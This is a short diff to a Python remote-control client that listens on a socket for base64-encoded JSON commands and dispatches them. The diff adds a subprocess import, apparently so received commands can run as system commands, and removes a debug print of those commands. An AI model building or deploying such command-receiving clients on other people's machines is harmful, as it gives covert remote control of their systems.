@@ -1,4 +1,4 @@
-import socket,base64,json,os,threading,sys
+import socket,base64,json,os,threading,sys,subprocess
 
 # import win32api,win32con
 #
@@ -116,7 +116,6 @@ class ControlClient():
                     print(self.id)
                     while True:
                         t=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
-                        print(t)
                         self.cur_command=t['command']
                         self.cur_args=t['args']
                         self.handleCommand()
